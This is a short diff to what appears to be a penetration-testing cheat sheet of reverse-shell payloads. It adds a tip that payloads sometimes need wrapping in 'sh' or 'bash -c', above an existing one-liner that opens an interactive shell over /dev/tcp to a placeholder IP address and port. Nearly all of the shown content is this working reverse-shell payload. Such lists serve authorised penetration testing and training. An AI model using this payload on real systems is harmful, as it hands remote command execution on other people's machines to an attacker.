@@ -17,6 +17,8 @@ run
 
 ## Payloads
 
+Note: Sometimes need to sh or bash -c 'revshell' for these to work.
+
 sh -i
 `sh -i >& /dev/tcp/ipaddress/port 0>&1`
 
